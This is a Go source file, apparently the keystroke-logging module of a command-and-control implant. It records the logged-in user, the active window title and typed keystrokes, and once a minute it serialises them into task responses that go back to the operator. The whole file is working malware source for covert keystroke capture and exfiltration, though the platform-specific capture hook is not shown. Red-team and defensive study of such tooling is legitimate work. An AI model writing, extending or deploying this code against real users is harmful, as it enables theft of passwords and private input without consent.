package keystate

import (
	"encoding/json"
	"errors"
	"fmt"

	//"log"
	"os/user"
	"sync"
	"time"

	"pkg/profiles"
	"pkg/utils/structs"
)

var (
	curTask *structs.Task
	// Struct to monitor keystrokes.
	ksmonitor, _ = NewKeyLog()
	// Maps strings to their shift counter-parts on US keyboards.
	shiftMap = map[string]string{
		"a":  "A",
		"b":  "B",
		"c":  "C",
		"d":  "D",
		"e":  "E",
		"f":  "F",
		"g":  "G",
		"h":  "H",
		"i":  "I",
		"j":  "J",
		"k":  "K",
		"l":  "L",
		"m":  "M",
		"n":  "N",
		"o":  "O",
		"p":  "P",
		"q":  "Q",
		"r":  "R",
		"s":  "S",
		"t":  "T",
		"u":  "U",
		"v":  "V",
		"w":  "W",
		"x":  "X",
		"y":  "Y",
		"z":  "Z",
		"1":  "!",
		"2":  "@",
		"3":  "#",
		"4":  "$",
		"5":  "%",
		"6":  "^",
		"7":  "&",
		"8":  "*",
		"9":  "(",
		"0":  ")",
		"-":  "_",
		"=":  "+",
		"[":  "{",
		"]":  "}",
		"\\": "|",
		";":  ":",
		"'":  "\"",
		",":  "<",
		".":  ">",
		"/":  "?",
		"`":  "~",
	}
)

type KeyLog struct {
	User        string `json:"user"`
	WindowTitle string `json:"window_title"`
	Keystrokes  string `json:"keystrokes"`
	mtx         sync.Mutex
}

type serializableKeyLog struct {
	User        string `json:"user"`
	WindowTitle string `json:"window_title"`
	Keystrokes  string `json:"keystrokes"`
}

func (k *KeyLog) AddKeyStrokes(s string) {
	k.mtx.Lock()
	k.Keystrokes += s
	k.mtx.Unlock()
}

func (k *KeyLog) ToSerialStruct() serializableKeyLog {
	return serializableKeyLog{
		User:        k.User,
		WindowTitle: k.WindowTitle,
		Keystrokes:  k.Keystrokes,
	}
}

func (k *KeyLog) SetWindowTitle(s string) {
	k.mtx.Lock()
	k.WindowTitle = s
	k.mtx.Unlock()
}

func (k *KeyLog) SendMessage() {
	serMsg := ksmonitor.ToSerialStruct()
	msg := structs.Response{}
	msg.TaskID = curTask.TaskID
	data, err := json.MarshalIndent(serMsg, "", "    ")
	//log.Println("Sending across the wire:", string(data))
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Status = "error"
		msg.Completed = true
		resp, _ := json.Marshal(msg)
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
	} else {
		profiles.TaskResponses = append(profiles.TaskResponses, data)
	}
}

func NewKeyLog() (KeyLog, error) {
	curUser, err := user.Current()
	if err != nil {
		return KeyLog{}, err
	}
	return KeyLog{
		User:        curUser.Username,
		WindowTitle: "",
		Keystrokes:  "",
	}, nil
}

func StartKeylogger(task structs.Task) error {
	// This function is responsible for dumping output.
	if curTask != nil && curTask.Job.Monitoring {
		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
	}

	go func() {
		for {
			timer := time.NewTimer(time.Minute)
			<-timer.C
			if ksmonitor.Keystrokes != "" {
				ksmonitor.mtx.Lock()
				ksmonitor.SendMessage()
				ksmonitor.Keystrokes = ""
				ksmonitor.mtx.Unlock()
			}
			if *task.Job.Stop > 0 {
				break
			}
		}
	}()
	err := keyLogger()
	return err
}
